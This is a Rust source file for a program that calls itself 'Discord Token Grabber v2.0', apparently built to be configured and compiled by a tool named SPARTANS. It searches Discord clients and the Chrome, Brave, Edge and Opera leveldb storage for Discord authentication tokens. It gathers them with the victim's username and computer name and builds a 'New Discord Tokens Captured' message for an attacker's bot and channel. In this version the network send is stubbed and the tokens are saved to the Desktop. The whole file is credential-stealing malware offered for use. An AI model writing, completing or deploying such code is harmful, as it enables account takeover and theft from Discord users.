use std::env;
use std::fs;
use std::path::Path;

// These will be replaced by SPARTANS when compiling
const BOT_TOKEN: &str = "YOUR_BOT_TOKEN_HERE";
const CHANNEL_ID: &str = "YOUR_CHANNEL_ID_HERE";

fn main() {
    println!("╔════════════════════════════════════════╗");
    println!("║  Discord Token Grabber v2.0            ║");
    println!("║  Initializing...                       ║");
    println!("╚════════════════════════════════════════╝\n");
    
    let tokens = find_discord_tokens();
    
    if tokens.is_empty() {
        println!("[!] No tokens found");
        println!("[*] Checked locations:");
        println!("    - Discord (AppData & LocalAppData)");
        println!("    - Discord Canary");
        println!("    - Discord PTB");
        println!("    - Google Chrome");
        println!("    - Brave Browser");
        println!("    - Microsoft Edge");
        println!("    - Opera");
    } else {
        println!("[+] Found {} unique token(s)\n", tokens.len());
        
        for (i, token) in tokens.iter().enumerate() {
            let preview_len = 30.min(token.len());
            println!("  [{}] {}...", i + 1, &token[..preview_len]);
        }
        
        println!();
        send_to_discord(&tokens);
    }
    
    println!("\n╔════════════════════════════════════════╗");
    println!("║  Press Enter to exit...                ║");
    println!("╚════════════════════════════════════════╝");
    
    let mut input = String::new();
    std::io::stdin().read_line(&mut input).ok();
}

fn find_discord_tokens() -> Vec<String> {
    let mut tokens = Vec::new();
    
    println!("[*] Scanning for Discord tokens...\n");
    
    let appdata = match env::var("APPDATA") {
        Ok(path) => path,
        Err(_) => {
            println!("[!] Cannot access APPDATA");
            return tokens;
        }
    };
    
    let local = match env::var("LOCALAPPDATA") {
        Ok(path) => path,
        Err(_) => {
            println!("[!] Cannot access LOCALAPPDATA");
            return tokens;
        }
    };
    
    // Discord locations
    let paths = vec![
        // Discord installations
        (format!("{}\\discord\\Local Storage\\leveldb", appdata), "Discord (AppData)"),
        (format!("{}\\discordcanary\\Local Storage\\leveldb", appdata), "Discord Canary"),
        (format!("{}\\discordptb\\Local Storage\\leveldb", appdata), "Discord PTB"),
        (format!("{}\\Discord\\Local Storage\\leveldb", local), "Discord (LocalAppData)"),
        
        // Browsers
        (format!("{}\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb", local), "Google Chrome"),
        (format!("{}\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb", local), "Brave Browser"),
        (format!("{}\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb", local), "Microsoft Edge"),
        (format!("{}\\Opera Software\\Opera Stable\\Local Storage\\leveldb", appdata), "Opera"),
    ];
    
    for (path, name) in paths {
        print!("[*] Scanning {}... ", name);
        
        match search_tokens_in_path(&path) {
            Ok(found) => {
                if found.is_empty() {
                    println!("No tokens");
                } else {
                    println!("Found {} token(s)", found.len());
                    tokens.extend(found);
                }
            }
            Err(_) => {
                println!("Not found");
            }
        }
    }
    
    // Remove duplicates
    tokens.sort();
    tokens.dedup();
    
    println!();
    tokens
}

fn search_tokens_in_path(path: &str) -> Result<Vec<String>, std::io::Error> {
    let mut tokens = Vec::new();
    let path = Path::new(path);
    
    if !path.exists() {
        return Err(std::io::Error::new(
            std::io::ErrorKind::NotFound,
            "Path not found"
        ));
    }
    
    let entries = fs::read_dir(path)?;
    
    for entry in entries {
        let entry = entry?;
        let file_path = entry.path();
        
        // Only process .ldb and .log files
        if let Some(ext) = file_path.extension() {
            if ext == "ldb" || ext == "log" {
                if let Ok(content) = fs::read(&file_path) {
                    let text = String::from_utf8_lossy(&content);
                    
                    // Extract tokens from file content
                    for token in extract_tokens(&text) {
                        if is_valid_token(&token) {
                            tokens.push(token);
                        }
                    }
                }
            }
        }
    }
    
    Ok(tokens)
}

fn extract_tokens(text: &str) -> Vec<String> {
    let mut tokens = Vec::new();
    
    // Search for mfa. tokens (2FA tokens)
    let mut start_idx = 0;
    while let Some(pos) = text[start_idx..].find("mfa.") {
        let abs_pos = start_idx + pos;
        let token_end = (abs_pos + 90).min(text.len());
        
        if let Some(token_text) = text.get(abs_pos..token_end) {
            // Find where token ends (quote, whitespace, etc)
            if let Some(end) = token_text.find(|c: char| c == '"' || c == '\'' || c.is_whitespace()) {
                let token = token_text[..end].to_string();
                if token.len() > 20 {
                    tokens.push(token);
                }
            }
        }
        start_idx = abs_pos + 4;
    }
    
    // Search for regular Discord tokens (base64 format)
    // Discord tokens start with MT, OD, or N followed by base64 characters
    for prefix in &["MT", "OD", "N"] {
        start_idx = 0;
        
        while let Some(pos) = text[start_idx..].find(prefix) {
            let abs_pos = start_idx + pos;
            
            // Check if this is actually the start of a token (not middle of word)
            if abs_pos > 0 {
                if let Some(prev_char) = text.chars().nth(abs_pos - 1) {
                    if prev_char.is_alphanumeric() {
                        start_idx = abs_pos + 1;
                        continue;
                    }
                }
            }
            
            let token_end = (abs_pos + 100).min(text.len());
            
            if let Some(token_text) = text.get(abs_pos..token_end) {
                // Find end of token (non-base64 character)
                if let Some(end) = token_text.find(|c: char| {
                    !c.is_alphanumeric() && c != '-' && c != '_' && c != '.'
                }) {
                    let token = token_text[..end].to_string();
                    
                    // Discord tokens have 3 parts separated by dots
                    if token.len() > 50 && token.len() < 100 && token.matches('.').count() == 2 {
                        tokens.push(token);
                    }
                }
            }
            
            start_idx = abs_pos + prefix.len();
        }
    }
    
    tokens
}

fn is_valid_token(token: &str) -> bool {
    // Token must be at least 50 characters
    if token.len() < 50 {
        return false;
    }
    
    // Check for mfa tokens
    if token.starts_with("mfa.") {
        return token.len() > 20 && token.len() < 200;
    }
    
    // Check for regular tokens (MT*, OD*, N*)
    if token.starts_with("MT") || token.starts_with("OD") || token.starts_with("N") {
        let parts: Vec<&str> = token.split('.').collect();
        
        // Must have 3 parts
        if parts.len() != 3 {
            return false;
        }
        
        // Each part should be base64-like
        for part in parts {
            if part.is_empty() {
                return false;
            }
            
            // Check if contains mostly valid base64 characters
            let valid_chars = part.chars().filter(|c| {
                c.is_alphanumeric() || *c == '-' || *c == '_'
            }).count();
            
            if valid_chars < part.len() {
                return false;
            }
        }
        
        return true;
    }
    
    false
}

fn send_to_discord(tokens: &[String]) {
    println!("[*] Preparing to send to Discord...\n");
    
    // Check if bot is configured
    if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE" || CHANNEL_ID == "YOUR_CHANNEL_ID_HERE" {
        println!("[!] ╔══════════════════════════════════════════════╗");
        println!("[!] ║  Bot not configured!                         ║");
        println!("[!] ╠══════════════════════════════════════════════╣");
        println!("[!] ║  Please configure bot in SPARTANS:           ║");
        println!("[!] ║  1. Run SPARTANS.exe                         ║");
        println!("[!] ║  2. Choose option [1] Configure Discord Bot  ║");
        println!("[!] ║  3. Enter your bot token and channel ID      ║");
        println!("[!] ║  4. Recompile this grabber                   ║");
        println!("[!] ╚══════════════════════════════════════════════╝\n");
        
        save_backup(tokens);
        return;
    }
    
    // Get system information
    let username = env::var("USERNAME").unwrap_or_else(|_| "Unknown".to_string());
    let computername = env::var("COMPUTERNAME").unwrap_or_else(|_| "Unknown".to_string());
    
    // Build message
    let mut message = String::from("🎯 **New Discord Tokens Captured**\n\n");
    message.push_str(&format!("**System Information:**\n"));
    message.push_str(&format!("👤 User: `{}`\n", username));
    message.push_str(&format!("💻 Computer: `{}`\n", computername));
    message.push_str(&format!("📊 Total Tokens: **{}**\n\n", tokens.len()));
    message.push_str("**Tokens Found:**\n");
    
    for (i, token) in tokens.iter().enumerate() {
        message.push_str(&format!("{}. ```{}```\n", i + 1, token));
    }
    
    println!("[+] Message prepared:");
    println!("    User: {}", username);
    println!("    Computer: {}", computername);
    println!("    Total tokens: {}", tokens.len());
    
    // Save local backup
    save_backup(tokens);
    
    println!("\n[*] Note: Actual Discord API sending not implemented in this version");
    println!("[*] Tokens have been saved to Desktop/discord_tokens.txt");
    println!("\n[+] Done!");
}

fn save_backup(tokens: &[String]) {
    if let Ok(userprofile) = env::var("USERPROFILE") {
        let desktop = Path::new(&userprofile).join("Desktop");
        let log_file = desktop.join("discord_tokens.txt");
        
        let username = env::var("USERNAME").unwrap_or_else(|_| "Unknown".to_string());
        let computername = env::var("COMPUTERNAME").unwrap_or_else(|_| "Unknown".to_string());
        
        let mut content = String::from("════════════════════════════════════════════\n");
        content.push_str("  DISCORD TOKENS BACKUP\n");
        content.push_str("════════════════════════════════════════════\n\n");
        content.push_str(&format!("User: {}\n", username));
        content.push_str(&format!("Computer: {}\n", computername));
        content.push_str(&format!("Total Tokens: {}\n\n", tokens.len()));
        content.push_str("TOKENS:\n");
        content.push_str("────────────────────────────────────────────\n\n");
        
        for (i, token) in tokens.iter().enumerate() {
            content.push_str(&format!("[{}] {}\n\n", i + 1, token));
        }
        
        content.push_str("════════════════════════════════════════════\n");
        
        if fs::write(&log_file, content).is_ok() {
            println!("[+] Backup saved to: Desktop/discord_tokens.txt");
        } else {
            println!("[!] Failed to save backup to Desktop");
        }
    }
}
